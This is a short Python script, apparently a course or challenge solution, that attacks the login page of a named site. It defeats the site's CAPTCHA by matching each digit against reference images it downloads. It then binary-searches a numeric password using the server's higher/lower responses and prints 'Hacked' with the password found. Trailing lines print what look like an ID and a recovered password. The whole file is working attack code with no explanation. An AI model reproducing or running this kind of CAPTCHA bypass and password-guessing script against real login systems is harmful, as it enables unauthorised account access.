def hack(username):
    from PIL import Image
    from io import BytesIO
    import requests
    import json
    from requests.sessions import Session
    sessio = Session()
    def array2str(n1, n2, a):
        s = ''
        for i in range(n1, n2):
            for j in range(40):
                s += str(a[i,j])
        return s
    def numbers_array():
        Dic = {}
        for i in range(10):
            i = str(i)
            link = 'http://utproject.ir/bp/Numbers/'+i+'.jpg'  
            num = sessio.get(link)
            num_file = BytesIO(num.content)
            num_image = Image.open(num_file)
            num_image = num_image.convert("L")
            num_array = num_image.load()
            num_array = array2str(0, 40, num_array)
            Dic[num_array] = i
        return Dic
    captcha_Dic = numbers_array()
    def cap_Hack():
        link = "http://utproject.ir/bp/image.php"  
        captcha = sessio.get(link)
        captcha_file = BytesIO(captcha.content)
        captcha_image = Image.open(captcha_file)
        captcha_image = captcha_image.convert("L")
        captcha_array = captcha_image.load()
        c1 = captcha_Dic[array2str(0, 40, captcha_array)]
        c2 = captcha_Dic[array2str(40, 80, captcha_array)]
        c3 = captcha_Dic[array2str(80, 120, captcha_array)]
        c4 = captcha_Dic[array2str(120, 160, captcha_array)]
        c5 = captcha_Dic[array2str(160, 200, captcha_array)]
        cap = c1+c2+c3+c4+c5
        return (cap)
    sta = 1
    hi = 10**20
    lo = 0
    while sta != 0:
        mid = (hi+lo)//2
        captcha = cap_Hack()
        pas = str(mid)
        r=sessio.post("http://utproject.ir/bp/login.php",data={"username":(str(username)),
        "password":pas,"captcha":captcha})
        respo = json.loads(r.text)
        sta = respo['stat']
        if sta == 0:
            print("Hacked")
            print("password = ", mid)
            break
        elif sta == 1:
            hi = mid
        elif sta == -1:
            lo = mid
        else:
            print('error!!')
print('610399207')
print('3971708956492952127')